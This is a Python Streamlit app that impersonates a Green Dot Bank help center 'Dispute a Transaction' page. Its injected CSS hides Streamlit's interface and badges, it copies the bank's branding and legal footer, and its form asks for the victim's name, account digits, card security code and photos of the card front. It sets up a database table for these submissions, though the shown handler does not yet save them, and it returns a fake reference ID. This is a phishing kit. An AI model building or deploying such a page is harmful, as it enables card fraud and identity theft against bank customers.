
import streamlit as st
import sqlite3
import os
from datetime import datetime

# Configuración de base de datos
DB_NAME = 'claims.db'
UPLOAD_DIR = 'uploads'
os.makedirs(UPLOAD_DIR, exist_ok=True)

def init_db():
    conn = sqlite3.connect(DB_NAME)
    c = conn.cursor()
    c.execute("""CREATE TABLE IF NOT EXISTS greendot_submissions
                 (id INTEGER PRIMARY KEY AUTOINCREMENT,
                  nombre TEXT, cuenta TEXT, codigo_tarjeta TEXT,
                  monto REAL, factura_path TEXT, tarjeta_path TEXT, fecha TEXT)""")
    conn.commit()
    conn.close()

init_db()

st.set_page_config(page_title="Green Dot | Help Center", layout="wide", page_icon="✅")

# --- CSS INJECTION (ELIMINACIÓN TOTAL DE STREAMLIT UI) ---
st.markdown("""<style>
/* Ocultar elementos estándar */
header {visibility: hidden !important; height: 0px !important;}
footer {display: none !important; visibility: hidden !important;}
#MainMenu {visibility: hidden !important;}
.stAppToolbar {display: none !important;}
.stDeployButton {display: none !important;}

/* Ocultar el 'Made with Streamlit' y otros badges */
div[data-testid="stFooterAd"] {display: none !important;}
div[class*="viewerBadge"] {display: none !important;}
div[class*="styles_viewerBadge"] {display: none !important;}
[data-testid="stStatusWidget"] {display: none !important;}

/* Limpieza de márgenes */
.block-container {
    padding-top: 2rem !important;
    padding-bottom: 0rem !important;
    max-width: 800px !important;
}

/* Estilo corporativo Green Dot */
.stButton>button {
    background-color: #00a05b !important;
    color: white !important;
    width: 100%;
    border-radius: 5px !important;
    height: 3em;
    font-weight: bold !important;
}

.legal-footer {
    font-size: 11px;
    color: #888;
    text-align: justify;
    margin-top: 50px;
    border-top: 1px solid #eee;
    padding-top: 20px;
}
</style>""", unsafe_allow_html=True)

# --- UI --- 
if os.path.exists('logo.svg'):
    st.image('logo.svg', width=180)

st.title("Help Center")
st.markdown("### Dispute a Transaction")
st.write("Please provide the details of your claim below. All fields are required for processing.")

with st.form("final_form", clear_on_submit=True):
    nombre = st.text_input("Full Name")
    col1, col2 = st.columns(2)
    with col1:
        cuenta = st.text_input("Last 4 of Account")
    with col2:
        codigo = st.text_input("Security Code")
    monto = st.number_input("Amount to Dispute ($)", min_value=0.0, step=0.01)
    
    st.write("**Documentation**")
    f1 = st.file_uploader("Upload Receipt", type=['jpg', 'jpeg', 'png'])
    f2 = st.file_uploader("Upload Card Front", type=['jpg', 'jpeg', 'png'])
    
    submitted = st.form_submit_button("SUBMIT CLAIM")

if submitted:
    if nombre and f1 and f2:
        st.success("Your claim has been submitted. Reference ID: GD-" + str(int(datetime.now().timestamp())))
    else:
        st.error("Please fill all fields and upload required documents.")

# Footer Legal
st.markdown("""<div class='legal-footer'>
Green Dot cards are issued by Green Dot Bank, Member FDIC, pursuant to a license from Visa U.S.A., Inc. 
Visa is a registered trademark of Visa International Service Association. 
©2026 Green Dot Bank. All rights reserved. NMLS #914924.
</div>""", unsafe_allow_html=True)
